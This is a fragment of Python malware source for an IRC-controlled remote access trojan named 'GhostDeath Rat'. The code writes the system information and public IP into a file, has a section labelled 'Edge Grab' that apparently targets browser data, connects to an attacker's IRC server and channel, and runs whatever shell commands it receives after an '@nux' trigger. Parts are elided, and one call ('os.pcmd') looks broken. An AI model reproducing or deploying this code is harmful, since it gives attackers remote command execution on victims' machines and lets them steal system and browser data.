...
import re
####Systeminfo with Pub IP
public_ip = requests.get("https://api.ipify.org").text
os.system("systeminfo >> sys.txt")
f = open("sys.txt", "a")
f.write(public_ip)
f.close()
#############Edge Grab
...
def connect():
    server = "irc.ghosted.null"; 
    channel = "#ghostedeath"; # Channel
    botnick = ""+userpro+"ip"+public+""; # Your bots nick
    ircsock.connect((server, 6667)); 
    sendstr = "USER "+botnick+" "+botnick+" "+botnick+" :Wsup\r\n";
...
def joinchan(chan):
    ...
    while 1:
        ...
        if ircmsg.lower().find(":@hi") != -1:
            ircsock.send(("PRIVMSG " + chan +" :Hi, Welcome to GhostDeath Rat\r\n" ).encode('utf-8'))
        ...
        if ircmsg.lower().find(":@nux") != -1:
            nux = ircmsg.lower()[ircmsg.lower().find(":@nux")+10:len(str(ircmsg))];
            null = os.pcmd(nux)
            outs = null.read()
